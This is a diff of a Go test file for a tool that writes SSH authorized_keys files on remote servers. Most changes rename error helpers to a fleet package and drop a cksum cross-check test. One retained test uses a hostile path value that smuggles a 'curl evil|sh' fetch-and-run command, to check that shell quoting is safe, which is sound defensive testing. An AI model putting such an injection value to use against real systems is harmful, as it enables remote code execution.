@@ -25,40 +25,6 @@ import (
 
 const managed = authkeys.ManagedHeader + "\nkey-line\n"
 
-func TestCksumMatchesPOSIXCksum(t *testing.T) {
-	// Fixed vectors pin the algorithm even where no cksum binary exists.
-	vectors := []struct {
-		in   string
-		want uint32
-	}{
-		{"", 4294967295},
-		{"abc", 1219131554},
-	}
-	for _, v := range vectors {
-		if got := Cksum([]byte(v.in)); got != v.want {
-			t.Errorf("Cksum(%q) = %d, want %d", v.in, got, v.want)
-		}
-	}
-	bin, err := exec.LookPath("cksum")
-	if err != nil {
-		t.Skip("no cksum binary to cross-check against")
-	}
-	inputs := [][]byte{[]byte(managed), bytes.Repeat([]byte("ssh-ed25519 AAAA x\n"), 4000), {0, 1, 2, 255}}
-	for _, in := range inputs {
-		c := exec.CommandContext(t.Context(), bin)
-		c.Stdin = bytes.NewReader(in)
-		out, err := c.Output()
-		if err != nil {
-			t.Fatalf("cksum: %v", err)
-		}
-		f := strings.Fields(string(out))
-		snap := SnapshotOf(false, in)
-		if len(f) < 2 || f[0] != strconv.FormatUint(uint64(snap.Cksum), 10) || f[1] != strconv.Itoa(snap.Size) {
-			t.Errorf("cksum binary says %q, Go says %d %d", out, snap.Cksum, snap.Size)
-		}
-	}
-}
-
 func TestScriptsAreSingleLineAndQuotePathOnce(t *testing.T) {
 	const hostile = "/etc/o'brien/keys; curl evil|sh"
 	for name, script := range map[string]string{
@@ -542,7 +508,7 @@ func TestWriteCmdThroughRealSh(t *testing.T) {
 			if code != unsafePathExit {
 				t.Fatalf("exit = %d, want %d", code, unsafePathExit)
 			}
-			assertAbsent(t, filepath.Join(home, ".ssh"), "IsRefusal promises nothing changed — no ~/.ssh may be created")
+			assertAbsent(t, filepath.Join(home, ".ssh"), "fleet.IsRefusal promises nothing changed — no ~/.ssh may be created")
 		})
 
 		t.Run("dotdot through a foreign symlink refuses and leaves nothing", func(t *testing.T) {
@@ -619,7 +585,7 @@ func TestWriteCmdThroughRealSh(t *testing.T) {
 
 		t.Run("CAS refusal removes the directory it created", func(t *testing.T) {
 			// The plan saw a file, but ~/.ssh is gone at write time: mkdir
-			// recreates it, the CAS refuses (46), and IsRefusal promises
+			// recreates it, the CAS refuses (46), and fleet.IsRefusal promises
 			// nothing changed — so the directory goes again.
 			home := t.TempDir()
 			code := runSh(t, sh, writeCmdFor("~/.ssh/authorized_keys", SnapshotOf(false, []byte("old\n")), len(managed)), home, []byte(managed))
@@ -1186,6 +1152,7 @@ func TestApplySentinelRefusals(t *testing.T) {
 		{lockedExit, new(*LockedError), true, "another apply is in progress"},
 		{unsafePathExit, new(*UnsafePathError), true, "not owned by the login user"},
 		{shortWriteExit, nil, false, "upload incomplete"},
+		{1, nil, false, "write on w failed (exit 1)"},
 	}
 	for _, tt := range tests {
 		t.Run(tt.wantIn, func(t *testing.T) {
@@ -1198,8 +1165,8 @@ func TestApplySentinelRefusals(t *testing.T) {
 			if tt.target != nil && !errors.As(err, tt.target) {
 				t.Errorf("err = %T, want %T", err, tt.target)
 			}
-			if IsRefusal(err) != tt.refusal {
-				t.Errorf("IsRefusal = %v, want %v", IsRefusal(err), tt.refusal)
+			if fleet.IsRefusal(err) != tt.refusal {
+				t.Errorf("fleet.IsRefusal = %v, want %v", fleet.IsRefusal(err), tt.refusal)
 			}
 			if len(s.cmds) != 1 || len(c.opts) != 1 {
 				t.Errorf("ran %d commands / %d connects, want 1/1 (nothing after a refused write)", len(s.cmds), len(c.opts))
@@ -1305,7 +1272,7 @@ func TestApplyLoginProbeFailureRestores(t *testing.T) {
 			if n := len(responses) + 1; len(s.cmds) != n || s.cmds[n-1] != restoreCmdFor(sshconn.DefaultAuthorizedKeysPath, tt.absent, SnapshotOf(false, r.Content)) {
 				t.Errorf("cmds = %q, want write, verify, then the restore", s.cmds)
 			}
-			if IsRefusal(err) {
+			if fleet.IsRefusal(err) {
 				t.Error("a rolled-back lockout is a failure, not a refusal")
 			}
 		})
@@ -1333,8 +1300,8 @@ func TestApplyInterruptedBeforeWrite(t *testing.T) {
 		s := &scriptedExec{}
 		c := &seamedConnect{}
 		err := seamedWriter(s, c).Apply(ctx, config.Server{Name: "w"}, req("x\n"))
-		if !errors.Is(err, ErrNotStarted) {
-			t.Fatalf("err = %v, want ErrNotStarted", err)
+		if !errors.Is(err, fleet.ErrWriteNotStarted) {
+			t.Fatalf("err = %v, want fleet.ErrWriteNotStarted", err)
 		}
 		if len(c.opts)+len(s.cmds) != 0 {
 			t.Error("nothing may run once ctx is canceled")
@@ -1349,8 +1316,8 @@ func TestApplyInterruptedBeforeWrite(t *testing.T) {
 			return nil, cctx.Err()
 		}}
 		err := w.Apply(ctx, config.Server{Name: "w"}, req("x\n"))
-		if !errors.Is(err, ErrNotStarted) {
-			t.Fatalf("err = %v, want ErrNotStarted", err)
+		if !errors.Is(err, fleet.ErrWriteNotStarted) {
+			t.Fatalf("err = %v, want fleet.ErrWriteNotStarted", err)
 		}
 		if len(s.cmds) != 0 {
 			t.Error("the write must not start after an interrupted connect")
@@ -1592,12 +1559,12 @@ func TestKeys2CmdsThroughRealSh(t *testing.T) {
 		t.Run("disable moves the file aside, replacing an old copy", func(t *testing.T) {
 			home, k2 := setup(t)
 			writeFile(t, k2, "ssh-ed25519 AAAA revoked\n")
-			writeFile(t, k2+Keys2DisabledSuffix, "older\n")
+			writeFile(t, k2+fleet.Keys2DisabledSuffix, "older\n")
 			if code := runSh(t, sh, disableKeys2Cmd(), home, nil); code != 0 {
 				t.Fatalf("exit = %d, want 0", code)
 			}
 			assertAbsent(t, k2, "authorized_keys2 must be gone")
-			if got := readFile(t, k2+Keys2DisabledSuffix); got != "ssh-ed25519 AAAA revoked\n" {
+			if got := readFile(t, k2+fleet.Keys2DisabledSuffix); got != "ssh-ed25519 AAAA revoked\n" {
 				t.Errorf("disabled copy = %q, want the moved file", got)
 			}
 		})
@@ -1621,11 +1588,11 @@ func TestKeys2CmdsThroughRealSh(t *testing.T) {
 			if code := runSh(t, sh, disableKeys2Cmd(), home, nil); code != 0 {
 				t.Fatalf("exit = %d, want 0", code)
 			}
-			assertAbsent(t, k2+Keys2DisabledSuffix, "nothing to move")
+			assertAbsent(t, k2+fleet.Keys2DisabledSuffix, "nothing to move")
 		})
 		t.Run("restore puts it back", func(t *testing.T) {
 			home, k2 := setup(t)
-			writeFile(t, k2+Keys2DisabledSuffix, "keys\n")
+			writeFile(t, k2+fleet.Keys2DisabledSuffix, "keys\n")
 			if code := runSh(t, sh, restoreKeys2Cmd(), home, nil); code != 0 {
 				t.Fatalf("exit = %d, want 0", code)
 			}
@@ -1636,7 +1603,7 @@ func TestKeys2CmdsThroughRealSh(t *testing.T) {
 		t.Run("restore never clobbers a recreated file", func(t *testing.T) {
 			home, k2 := setup(t)
 			writeFile(t, k2, "new\n")
-			writeFile(t, k2+Keys2DisabledSuffix, "keys\n")
+			writeFile(t, k2+fleet.Keys2DisabledSuffix, "keys\n")
 			if code := runSh(t, sh, restoreKeys2Cmd(), home, nil); code != changedExit {
 				t.Fatalf("exit = %d, want %d", code, changedExit)
 			}
@@ -1673,7 +1640,7 @@ func TestApplyDisablesKeys2BeforeTheProbe(t *testing.T) {
 	t.Run("disable failure still probes and is a failure", func(t *testing.T) {
 		s := &scriptedExec{responses: []execResp{{code: 0}, {code: 0, stdout: "x\n"}, {code: 1, stderr: "mv: denied"}}}
 		err := seamedWriter(s, &seamedConnect{}).Apply(context.Background(), config.Server{Name: "w"}, r)
-		if err == nil || !strings.Contains(err.Error(), "authorized_keys2") || IsRefusal(err) {
+		if err == nil || !strings.Contains(err.Error(), "authorized_keys2") || fleet.IsRefusal(err) {
 			t.Fatalf("err = %v, want a non-refusal authorized_keys2 failure", err)
 		}
 		var lo *LockoutError
